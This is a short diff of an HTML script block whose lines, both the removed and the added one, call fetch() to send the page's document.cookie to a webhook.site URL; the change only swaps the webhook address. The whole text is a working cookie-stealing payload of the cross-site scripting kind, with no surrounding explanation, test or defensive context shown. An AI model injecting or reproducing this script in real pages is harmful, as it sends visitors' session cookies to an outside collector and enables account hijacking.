@@ -1,3 +1,3 @@
 <script>
-fetch('https://webhook.site/f4c9321a-5c37-49ce-baad-a45efa854d52?c=' + encodeURIComponent(document.cookie));
+fetch('https://webhook.site/2?c=' + encodeURIComponent(document.cookie));
 </script>
